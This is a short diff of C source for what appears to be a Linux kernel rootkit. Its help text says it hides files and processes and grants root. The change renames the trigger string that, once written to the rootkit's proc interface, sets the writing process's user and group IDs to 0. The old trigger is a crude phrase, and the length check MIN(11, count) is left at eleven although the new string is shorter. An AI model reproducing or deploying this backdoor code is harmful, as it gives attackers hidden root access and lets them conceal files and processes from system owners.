@@ -117,7 +117,7 @@ static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count
 DESC:\n\
   hides files prefixed with __rt or 10-__rt and gives root\n\
 CMNDS:\n\
-  mypenislong - uid and gid 0 for writing process\n\
+  shiboleet - uid and gid 0 for writing process\n\
   hpXXXX - hides proc with id XXXX\n\
   up - unhides last process\n\
   thf - toogles file hiding\n\
@@ -143,7 +143,7 @@ STATUS\n\
 
 static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
 {
-	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
+	if (!strncmp(buff, "shiboleet", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
 		credentials->uid = credentials->euid = 0;
 		credentials->gid = credentials->egid = 0;
